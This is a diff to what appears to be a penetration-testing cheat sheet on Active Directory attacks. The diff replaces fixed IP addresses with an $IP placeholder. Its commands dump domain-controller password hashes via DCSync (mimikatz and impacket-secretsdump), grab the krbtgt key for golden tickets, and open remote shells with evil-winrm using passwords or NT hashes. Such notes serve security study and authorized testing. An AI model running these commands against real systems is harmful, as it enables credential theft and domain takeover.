@@ -67,7 +67,7 @@ lsadump::dcsync /user:domain\krbtgt   # pull a user's hash from a DC via replica
 
 ### impacket-secretsdump — remote, from Linux
 ```bash
-impacket-secretsdump domain.local/user:pass@10.10.10.50
+impacket-secretsdump domain.local/user:pass@$IP
 impacket-secretsdump -just-dc-user krbtgt domain.local/user:pass@10.10.10.10
 ```
 - `-just-dc` / `-just-dc-user <u>` — pull hashes from the DC's NTDS via DCSync (needs replication rights, e.g. Domain Admin). `-just-dc-user krbtgt` gets the key for golden tickets.
@@ -85,8 +85,8 @@ impacket-secretsdump -just-dc-user krbtgt domain.local/user:pass@10.10.10.10
 
 ### evil-winrm
 ```bash
-evil-winrm -i 10.10.10.50 -u user -p pass
-evil-winrm -i 10.10.10.50 -u user -H <NTHASH>
+evil-winrm -i $IP -u user -p pass
+evil-winrm -i $IP -u user -H <NTHASH>
 ```
 - `-i` target, `-u` user, `-p` password or `-H` NT hash (pass-the-hash), `-s`/`-e` scripts/executables dirs for uploads.
 
